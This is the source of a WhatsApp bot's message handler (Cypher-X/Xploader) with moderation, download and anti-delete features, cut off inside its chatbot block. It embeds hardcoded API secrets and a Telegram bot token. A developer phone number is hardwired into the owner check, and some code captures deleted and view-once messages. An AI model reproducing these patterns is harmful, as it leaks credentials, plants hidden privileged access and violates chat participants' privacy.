
require('./settings')
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  useMultiFileAuthState,
  makeWASocket,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("@whiskeysockets/baileys");
const { exec, spawn, execSync } = require("child_process")
const util = require('util')
const fetch = require('node-fetch')
const path = require('path')
const fs = require('fs');
const axios = require('axios')
const chalk = require('chalk')
const googleTTS = require("google-tts-api");
const acrcloud = require ('acrcloud');
const FormData = require('form-data');
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const { performance } = require("perf_hooks");
const process = require('process');
const moment = require("moment-timezone")
const lolcatjs = require('lolcatjs')
const os = require('os');
const scp2 = require("./lib/scraper2");
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const yts = require("yt-search")
const jsobfus = require("javascript-obfuscator");
const { translate } = require("@vitalets/google-translate-api");
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const timestampp = speed();
const latensi = speed() - timestampp
const { bytesToSize, checkBandwidth, formatSize, jsonformat, nganuin, shorturl, color } = require('./lib/function');
const { addExif } = require('./lib/exif');
const devTylor = '263781564004';
const mainOwner = "263781564004@s.whatsapp.net";
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar,
} = require("./lib/converter");
const {
    smsg,
    formatDate,
    getTime,
    getGroupAdmins,
    formatp,
    await,
    sleep,
    isUrl,
    runtime,   
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc')

//error handling
const errorLog = new Map();
const ERROR_EXPIRY_TIME = 60000; // 60 seconds

const recordError = (error) => {
  const now = Date.now();
  errorLog.set(error, now);
  setTimeout(() => errorLog.delete(error), ERROR_EXPIRY_TIME);
};

const shouldLogError = (error) => {
  const now = Date.now();
  if (errorLog.has(error)) {
    const lastLoggedTime = errorLog.get(error);
    if (now - lastLoggedTime < ERROR_EXPIRY_TIME) {
      return false;
    }
  }
  return true;
};

//Images
const tylorkid1 = fs.readFileSync("./Media/Images/Xploader1.jpg");
const tylorkid2 = fs.readFileSync("./Media/Images/Xploader2.jpg");
const tylorkid3 = fs.readFileSync("./Media/Images/Xploader3.jpg");
const tylorkid4 = fs.readFileSync("./Media/Images/Xploader4.jpg");
const tylorkid5 = fs.readFileSync("./Media/Images/Xploader5.jpg");

//Version
const versions = require("./package.json").version;
const dlkey = '_0x5aff35,_0x1876stqr';

//badwords
const bad = JSON.parse(fs.readFileSync("./src/badwords.json")); 

//Shazam
const acr = new acrcloud({
    host: 'identify-eu-west-1.acrcloud.com',
    access_key: '882a7ef12dc0dc408f70a2f3f4724340',
    access_secret: 'qVvKAxknV7bUdtxjXS22b5ssvWYxpnVndhy2isXP'
});

//Catbox upload
const { uploadMedia, handleMediaUpload } = require('./lib/catbox'); 

//database 
global.db.data = JSON.parse(fs.readFileSync("./src/database.json"));
if (global.db.data)
  global.db.data = {
    chats: {},
    settings: {},
    ...(global.db.data || {}),
  };

module.exports = Cypher = async (Cypher, m, chatUpdate, store) => {
try {
   const { type, quotedMsg, mentioned, now, fromMe } = m;
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
    //prefix 1
    var prefix = [".", "/"]
      ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
      : prefixz;
    const isCmd = body.startsWith(prefix, "");
    const isCmd2 = body.startsWith(prefix);
       //prefix 2
    const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : prefixz;
    const XpBotbody = body.startsWith(pric);
    const command = XpBotbody
      ? body.replace(pric, "").trim().split(/ +/).shift().toLowerCase()
      : "";
      
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m.pushName || "No Name";
const botNumber = await Cypher.decodeJid(Cypher.user.id);
const sender = m.sender
const senderNumber = sender.split('@')[0]
const isCreator = [botNumber, devTylor, global.ownernumber, ...global.sudo]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
const itsMe = m.sender == botNumber ? true : false;
const text = q = args.join(" ");
const from = m.key.remoteJid;
const fatkuns = m.quoted || m;
const quoted =
  fatkuns && fatkuns.mtype === "buttonsMessage" && Object.keys(fatkuns).length > 1
    ? fatkuns[Object.keys(fatkuns)[1]]
    : fatkuns && fatkuns.mtype === "templateMessage" && fatkuns.hydratedTemplate && Object.keys(fatkuns.hydratedTemplate).length > 1
    ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]]
    : fatkuns && fatkuns.mtype === "product" && Object.keys(fatkuns).length > 0
    ? fatkuns[Object.keys(fatkuns)[0]]
    : m.quoted
    ? m.quoted
    : m;
const mime = (quoted.msg || quoted).mimetype || "";
 const qmsg = quoted.msg || quoted;
const isMedia = /image|video|sticker|audio/.test(mime);
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
// Group Metadata
const groupMetadata = m.isGroup
  ? await Cypher.groupMetadata(m.chat).catch((e) => {
      console.error('Error fetching group metadata:', e);
      return null; // Return null if an error occurs
    })
  : null;

// Ensure groupMetadata is not null before accessing its properties
const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : "";
const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : [];
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isBot = botNumber.includes(senderNumber);
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const groupOwner = m.isGroup && groupMetadata ? groupMetadata.owner : "";
const isGroupOwner = m.isGroup
  ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender)
  : false;

//================== [ TIME ] ==================//
const dayz = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
const timez = moment(Date.now()).tz(`${timezones}`).locale('en').format('HH:mm:ss z');
const datez = moment(Date.now()).tz(`${timezones}`).format("DD/MM/YYYY");
if (timez < "23:59:00") {
  var timewisher = `Good Night 🌌`;
}
if (timez < "19:00:00") {
  var timewisher = `Good Evening 🌃`;
}
if (timez < "18:00:00") {
  var timewisher = `Good Evening 🌃`;
}
if (timez < "15:00:00") {
  var timewisher = `Good Afternoon 🌅`;
}
if (timez < "11:00:00") {
  var timewisher = `Good Morning 🌄`;
}
if (timez < "05:00:00") {
  var timewisher = `Good Morning 🌄`;
}


//================== [ FUNCTION ] ==================//
async function setHerokuEnvVar(varName, varValue) {
  const apiKey = process.env.HEROKU_API_KEY;
  const appName = process.env.HEROKU_APP_NAME;
  
  try {
    const response = await axios.patch(`https://api.heroku.com/apps/${appName}/config-vars`, {
      [varName]: varValue
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/vnd.heroku+json; version=3',
        'Authorization': `Bearer ${apiKey}`
      }
    });
    return response.data;
  } catch (error) {
    console.error('Error setting env var:', error);
    throw new Error(`Failed to set environment variable, please make sure you've entered heroku api key and app name correctly.`);
  }
}

async function getHerokuEnvVars() {
  const apiKey = process.env.HEROKU_API_KEY;
  const appName = process.env.HEROKU_APP_NAME;

  try {
    const response = await axios.get(`https://api.heroku.com/apps/${appName}/config-vars`, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/vnd.heroku+json; version=3',
        'Authorization': `Bearer ${apiKey}`
      }
    });
    return response.data;
  } catch (error) {
    console.error('Error getting env vars:', error);
    throw new Error('Failed to get environment variables');
  }
}

async function deleteHerokuEnvVar(varName) {
  const apiKey = process.env.HEROKU_API_KEY;
  const appName = process.env.HEROKU_APP_NAME;

  try {
    const response = await axios.patch(`https://api.heroku.com/apps/${appName}/config-vars`, {
      [varName]: null
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/vnd.heroku+json; version=3',
        'Authorization': `Bearer ${apiKey}`
      }
    });
    return response.data;
  } catch (error) {
    console.error('Error deleting env var:', error);
    throw new Error(`Failed to set environment variable, please make sure you've entered heroku api key and app name correctly`); 
  }
}


// Function to fetch MP3 download URL
async function fetchMp3DownloadUrl(link) {
  const fetchDownloadUrl1 = async (videoUrl) => {
    const apiUrl = `https://api.giftedtech.my.id/api/download/dlmp3?apikey=${dlkey}&url=${videoUrl}`;
    try {
      const response = await axios.get(apiUrl);
      if (response.status !== 200 || !response.data.success) {
        throw new Error('Failed to fetch from GiftedTech API');
      }
      return response.data.result.download_url;
    } catch (error) {
      console.error('Error with GiftedTech API:', error.message);
      throw error;
    }
  };

  const fetchDownloadUrl2 = async (videoUrl) => {
    const format = 'mp3';
    const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(videoUrl)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;
    try {
      const response = await axios.get(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
      });
      if (!response.data || !response.data.success) throw new Error('Failed to fetch from API2');

      const { id } = response.data;
      while (true) {
        const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
          }
        });
        if (progress.data && progress.data.success && progress.data.progress === 1000) {
          return progress.data.download_url;
        }
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    } catch (error) {
      console.error('Error with API2:', error.message);
      throw error;
    }
  };

  try {
    let downloadUrl;
    try {
      downloadUrl = await fetchDownloadUrl1(link);
    } catch (error) {
      console.log('Falling back to second API...');
      downloadUrl = await fetchDownloadUrl2(link);
    }
    return downloadUrl;
  } catch (error) {
    throw error;
  }
}

async function fetchVideoDownloadUrl(link) {
  const apiUrl = `https://api.giftedtech.my.id/api/download/dlmp4?apikey=${dlkey}&url=${encodeURIComponent(link)}`;
  
  try {
    const response = await axios.get(apiUrl);
    if (response.status !== 200 || !response.data.success) {
      throw new Error('Failed to retrieve the video!');
    }
    return response.data.result;
  } catch (error) {
    console.error('Error fetching video download URL:', error.message);
    throw error;
  }
}

async function saveStatusMessage(m) {
  try {
    // Ensure the message is a reply to a status
    if (!m.quoted || m.quoted.chat !== 'status@broadcast') {
      return m.reply('*Please reply to a status message!*');
    }

    // Forward the quoted status message directly
    await m.quoted.copyNForward(m.chat, true);

    // React to confirm successful save
    Cypher.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    console.log('Status saved successfully!');
  } catch (error) {
    console.error('Failed to save status message:', error);
    m.reply(`Error: ${error.message}`);
  }
}

async function Telesticker(url) {
      return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi))
          return m.reply("*_Enter your telegram sticker link_*");
        packName = url.replace("https://t.me/addstickers/", "");
        data = await axios(
          `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(
            packName
          )}`,
          { method: "GET", headers: { "User-Agent": "GoogleBot" } }
        );
        const XpBotresult = [];
        for (let i = 0; i < data.data.result.stickers.length; i++) {
          fileId = data.data.result.stickers[i].thumb.file_id;
          data2 = await axios(
            `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`
          );
          result = {
            status: 200,
            author: "Tylor",
            url:
              "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" +
              data2.data.result.file_path,
          };
          XpBotresult.push(result);
        }
        resolve(XpBotresult);
      });
    }
    
async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data",
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
 }

//obfuscator 
async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1,
          });
          const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode(),
          };
          resolve(result);
        } catch (e) {
          reject(e);
        }
      });
    }

 //cmds
const totalCmds = () => {
  const myText = fs.readFileSync("./Xploader.js", "utf8");
  const numUpper = (myText.match(/case "/g) || []).length;
  return numUpper;
};
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
 
// TAKE  PP USER
try {
var ppuser = await Cypher.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'}
let ppnyauser = await getBuffer(ppuser)
let ppUrl = await Cypher.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')

//================== [ DATABASE ] ==================//
try {
  // Ensure chat data is properly initialized 
  if (from.endsWith('@g.us')) { // Check if it's a group chat
    let chats = global.db.data.chats[from];
    if (typeof chats !== "object") global.db.data.chats[from] = {};
    chats = global.db.data.chats[from]; // Refresh the reference
    if (!("antibot" in chats)) chats.antibot = false;
    if (!("antilink" in chats)) chats.antilink = false;
    if (!("badword" in chats)) chats.badword = false; 
    if (!("antilinkgc" in chats)) chats.antilinkgc = false;
    if (!("antilinkkick" in chats)) chats.antilinkkick = false;
    if (!("badwordkick" in chats)) chats.badwordkick = false; 
    if (!("antilinkgckick" in chats)) chats.antilinkgckick = false;
  }

  // Ensure settings data is properly initialized
  let setting = global.db.data.settings[botNumber];
  if (typeof setting !== "object") global.db.data.settings[botNumber] = {};
  setting = global.db.data.settings[botNumber]; // Refresh the reference
  if (!("autobio" in setting)) setting.autobio = false;
  if (!("autorecordtype" in setting)) setting.autorecordtype = false;
  if (!("autorecord" in setting)) setting.autorecord = false;
  if (!("autotype" in setting)) setting.autotype = false;
  if (!("antiviewonce" in setting)) setting.antiviewonce = false;
  if (!("autoread" in setting)) setting.autoread = false;
} catch (err) {
  console.error("Error initializing database:", err);
}
//================== [ CONSOLE LOG] ==================//
if (m.message) {
  lolcatjs.fromString(`┏━━━━━━━━━━━━━『 CYPHER-X 』━━━━━━━━━━━━━─`);
  lolcatjs.fromString(`» Sent Time: ${dayz}, ${timez}`);
  lolcatjs.fromString(`» Message Type: ${m.mtype}`);
  lolcatjs.fromString(`» Sender Name: ${pushname || 'N/A'}`);
  lolcatjs.fromString(`» Chat ID: ${m.chat.split('@')[0]}`);
  lolcatjs.fromString(`» Message: ${budy || 'N/A'}`);
 lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
}
//<================================================>//
    //auto set bio\\
    if (db.data.settings[botNumber].autobio) {
let xdpy = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
let xtipe = moment(Date.now()).tz(`${timezones}`).locale('en').format('HH:mm z');
let xdpte = moment(Date.now()).tz(`${timezones}`).format("DD/MM/YYYY");
      Cypher.updateProfileStatus(
        `${xtipe}, ${xdpy}; ${xdpte}:- ${botname}`
      ).catch((_) => _);
    }
//<================================================>//
    //auto type record
    if (db.data.settings[botNumber].autorecordtype) {
      if (m.message) {
        let XpBotmix = ["composing", "recording"];
        XpBotmix2 = XpBotmix[Math.floor(XpBotmix.length * Math.random())];
        Cypher.sendPresenceUpdate(XpBotmix2, from);
      }
    }
    if (db.data.settings[botNumber].autorecord) {
      if (m.message) {
        let XpBotmix = ["recording"];
        XpBotmix2 = XpBotmix[Math.floor(XpBotmix.length * Math.random())];
        Cypher.sendPresenceUpdate(XpBotmix2, from);
      }
    }
    if (db.data.settings[botNumber].autotype) {
      if (m.message) {
        let XpBotpos = ["composing"];
        Cypher.sendPresenceUpdate(XpBotpos, from);
      }
    }   
//<================================================>//
    if (from.endsWith('@g.us') && db.data.chats[m.chat].antibot) {
  if (m.isBaileys && (!isAdmins || !isCreator || isBotAdmins )) {
          m.reply(`*BOT DETECTED*\n\nGo away!`);
          await Cypher.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
        }
    }
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].antilinkgc) {
    const groupLinkRegex = /(?:https?:\/\/)?chat\.whatsapp\.com\/\S+/i; // Robust regex for WhatsApp group links

    // Check if the message contains a WhatsApp group link
    if (m.message && groupLinkRegex.test(budy)) {
        if (isAdmins || isCreator || !isBotAdmins) return; // Skip for admins, creator, or if bot isn't admin

        // Silently delete the message
        await Cypher.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant,
            },
        });
    }
}
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].antilinkgckick) {
  const groupLinkRegex = /(?:https?:\/\/)?chat\.whatsapp\.com\/\S+/i; // Robust regex for WhatsApp group links

    // Check if the message contains a WhatsApp group link
    if (m.message && groupLinkRegex.test(budy)) {
        if (isAdmins || isCreator || !isBotAdmins) return; // Skip for admins, creator, or if bot isn't admin
    {
        if (isAdmins || isCreator || !isBotAdmins) return;
        await Cypher.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant,
            },
        });
        Cypher.sendMessage(
            from,
            {
                text: `GROUP LINK DETECTED\n\n@${m.sender.split("@")[0]} *Beware, group links are not allowed in this group!*`,
                contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
        );
      await Cypher.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
    }
}
}
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].antilink) {
    // Comprehensive regex for detecting links
    const linkRegex = /(?:https?:\/\/|www\.|t\.me\/|bit\.ly\/|tinyurl\.com\/|(?:[a-z0-9]+\.)+[a-z]{2,})(\/\S*)?/i;

    // Extract possible message content, including editedMessage
    const messageContent = 
        m.message?.conversation ||
        m.message?.extendedTextMessage?.text ||
        m.message?.imageMessage?.caption ||
        m.message?.videoMessage?.caption ||
        m.message?.pollCreationMessageV3?.name ||
        m.message?.editedMessage; // Check for editedMessage directly

    if (messageContent && linkRegex.test(messageContent)) {
        if (isAdmins || isCreator || !isBotAdmins) return; // Skip admins, creator, or if bot isn't admin

        // Delete the message silently
        await Cypher.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant,
            },
        });
    }
}
//<================================================>//
if (from.endsWith('@g.us') && db.data.chats[m.chat].antilinkkick) {

    // Comprehensive regex for detecting links
    const linkRegex = /(?:https?:\/\/|www\.|t\.me\/|bit\.ly\/|tinyurl\.com\/|(?:[a-z0-9]+\.)+[a-z]{2,})(\/\S*)?/i;

    // Check if the message contains a link
    if (m.message && linkRegex.test(budy)) {
        if (isAdmins || isCreator || !isBotAdmins) return; // Skip admins, creator, or if bot isn't an admin
 
        
        await Cypher.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant,
            },
        });
        await Cypher.sendMessage(
            from,
            {
                text: `LINK DETECTED\n\n@${m.sender.split("@")[0]} *Beware, links are not allowed in this group!*`,
                contextInfo: { mentionedJid: [m.sender] },
            },
            { quoted: m }
        );
     await Cypher.groupParticipantsUpdate(
            m.chat,
            [m.sender],
            "remove"
          );
    }
}
//<================================================>//
// Anti Bad Words
if (from.endsWith('@g.us') && db.data.chats[m.chat].badword) {
    for (let bak of bad) {
        let regex = new RegExp(`\\b${bak}\\b`, 'i'); // Case-insensitive regex for bad words
        if (regex.test(budy)) {
            if (isAdmins || isCreator || !isBotAdmins) return; // Skip for admins, creator, or if bot isn't admin

            // Delete the message silently
            await Cypher.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant,
                },
            });

            // Notify the user
            await Cypher.sendMessage(
                from,
                {
                    text: `BAD WORD DETECTED\n\n@${
                        m.sender.split("@")[0]
                    } *Beware, using bad words is prohibited in this group!*`,
                    contextInfo: { mentionedJid: [m.sender] },
                },
                { quoted: m }
            );
            break; // Exit after detecting the first bad word
        }
    }
}

if (from.endsWith('@g.us') && db.data.chats[m.chat].badwordkick) {
    for (let bak of bad) {
        let regex = new RegExp(`\\b${bak}\\b`, 'i'); // Case-insensitive regex for bad words
        if (regex.test(budy)) {
            if (isAdmins || isCreator || !isBotAdmins) return; // Skip for admins, creator, or if bot isn't admin

            // Delete the message silently
            await Cypher.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant,
                },
            });

            // Notify the user and remove them
            await Cypher.sendMessage(
                from,
                {
                    text: `BAD WORD DETECTED\n\n@${
                        m.sender.split("@")[0]
                    } *You have been removed for using prohibited language!*`,
                    contextInfo: { mentionedJid: [m.sender] },
                },
                { quoted: m }
            );

            // Kick the user
            await Cypher.groupParticipantsUpdate(
                m.chat,
                [m.sender],
                "remove"
            );
            break; // Exit after detecting the first bad word
        }
    }
}
//<================================================>//
const storeFile = "./src/store.json";

// Function to load stored messages
function loadStoredMessages() {
    if (fs.existsSync(storeFile)) {
        return JSON.parse(fs.readFileSync(storeFile));
    }
    return {};
}

//*---------------------------------------------------------------*//
if (
    global.antidelete === 'private' &&
    m.message?.protocolMessage?.type === 0 && 
    m.message?.protocolMessage?.key
) {
    try {
        let messageId = m.message.protocolMessage.key.id;
        let chatId = m.chat;
        let deletedBy = m.sender;

        let storedMessages = loadStoredMessages();
        let deletedMsg = storedMessages[chatId]?.[messageId];

        if (!deletedMsg) {
            console.log("⚠️ Deleted message not found in store.json.");
            return;
        }

        let sender = deletedMsg.sender;
        let chatName = chatId.endsWith("@g.us") ? `(Group Chat)` : "(Private Chat)";

        let xtipes = moment(deletedMsg.timestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
        let xdptes = moment(deletedMsg.timestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");

        let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}

𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${deletedMsg.text}`;

        let quotedMessage = {
            key: {
                remoteJid: chatId,
                fromMe: sender === Cypher.user.id,
                id: messageId,
                participant: sender
            },
            message: {
                conversation: deletedMsg.text 
            }
        };

await Cypher.sendMessage(Cypher.user.id, { text: replyText, mentions: [sender, deletedBy] }, { quoted: quotedMessage });

    } catch (err) {
        console.error("❌ Error processing deleted message:", err);
    }
} else if (
    global.antidelete === 'chat' &&
    m.message?.protocolMessage?.type === 0 && 
    m.message?.protocolMessage?.key
) {
    try {
        let messageId = m.message.protocolMessage.key.id;
        let chatId = m.chat;
        let deletedBy = m.sender;

        let storedMessages = loadStoredMessages();
        let deletedMsg = storedMessages[chatId]?.[messageId];

        if (!deletedMsg) {
            console.log("⚠️ Deleted message not found in store.json.");
            return;
        }

        let sender = deletedMsg.sender;
        let chatName = chatId.endsWith("@g.us") ? `(Group Chat)` : "(Private Chat)";

        let xtipes = moment(deletedMsg.timestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
        let xdptes = moment(deletedMsg.timestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");

        let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
${readmore}
𝙲𝙷𝙰𝚃: ${chatName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}

𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${deletedMsg.text}`;

        let quotedMessage = {
            key: {
                remoteJid: chatId,
                fromMe: sender === Cypher.user.id,
                id: messageId,
                participant: sender
            },
            message: {
                conversation: deletedMsg.text 
            }
        };

await Cypher.sendMessage(m.chat, { text: replyText, mentions: [sender, deletedBy] }, { quoted: quotedMessage });

    } catch (err) {
        console.error("❌ Error processing deleted message:", err);
    }
} 

//<================================================>//
if (global.alwaysonline === 'false') {
    if (m.message) {
        Cypher.sendPresenceUpdate("unavailable", from);
    }
} else if (global.alwaysonline === 'true') {
    if (m.message) {
        Cypher.sendPresenceUpdate("available", from);
    }
}
//=================================================//
if (global.autoread === 'true') {
  Cypher.readMessages([m.key]);
}
//<================================================>//
if (
    m.quoted &&
    (m.quoted.viewOnce || m.msg?.contextInfo?.quotedMessage) &&
    (m.message?.conversation || m.message?.extendedTextMessage) &&
    isCreator &&
    ['🌚', '😂', '🥲', '🤔', '🤭', '🍆', '🥵', '🫂', '😳'].some((emoji) => m.body.startsWith(emoji))
) {
    try {
        let msg = m.msg?.contextInfo?.quotedMessage;
        if (!msg) return console.log('Quoted message not found.');

        let type = Object.keys(msg)[0];
        if (!type || !/image|video/.test(type)) {
            console.log('*Invalid media type!*');
            return;
        }

        // Download media content
        const media = await downloadContentFromMessage(
            msg[type],
            type === 'imageMessage' ? 'image' : 'video'
        );

        const bufferArray = [];
        for await (const chunk of media) {
            bufferArray.push(chunk);
        }

        const buffer = Buffer.concat(bufferArray);

        // Send the downloaded media
        await Cypher.sendMessage(
            Cypher.user.id,
            type === 'videoMessage'
                ? { video: buffer, caption: '*᙭ᑭᒪOᗩᗪᗴᖇ ᗷOT*' }
                : { image: buffer, caption: '*᙭ᑭᒪOᗩᗪᗴᖇ ᗷOT*' },
            { quoted: m }
        );

    } catch (err) {
        console.error('Error processing media:', err);
    }
} else if (
   m.message &&
   m.message.extendedTextMessage?.contextInfo?.quotedMessage &&
    !command &&
    isCreator &&
    m.quoted.chat === 'status@broadcast'
) {
    try {
        // Forward the quoted status message directly
        await m.quoted.copyNForward(Cypher.user.id, true);

        console.log('Status forwarded successfully!');
    } catch (err) {
        console.error('Error forwarding status:', err);
    }
}
//=================================================//;
if (
    global.chatbot && global.chatbot === 'true' && 
    (m.message.extendedTextMessage?.text || m.message.conversation) && 
    !isCreator && !m.isGroup && !command
) {
    try {
        const userId = m.sender; // Extract the sender's user ID
        const userMessage = m.message.extendedTextMessage?.text || m.message.conversation || ''; // Normalize message content

        if (!userMessage.trim()) {
            return; // Ignore empty messages
        }

        // Send a typing indicator
        await Cypher.sendPresenceUpdate('composing', m.chat);

        // Function to call the fallback API
        const callFallbackAPI = async () => {
